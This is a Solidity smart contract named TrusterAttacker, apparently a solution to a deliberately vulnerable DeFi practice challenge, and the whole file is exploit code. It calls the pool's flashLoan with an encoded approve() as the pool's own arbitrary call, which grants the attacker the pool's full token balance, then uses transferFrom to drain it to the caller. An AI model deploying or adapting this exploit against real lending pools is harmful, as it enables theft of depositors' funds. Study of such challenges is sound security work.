// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "hardhat/console.sol";

contract TrusterAttacker {
    function exploit(address pool, IERC20 token) external {
        uint256 poolBalance = token.balanceOf(pool);
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        pool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                poolBalance,
                pool,
                address(token),
                payload
            )
        );
        // uint256 allowed = token.allowance(pool, msg.sender);
        token.transferFrom(pool, msg.sender, poolBalance);
    }
}
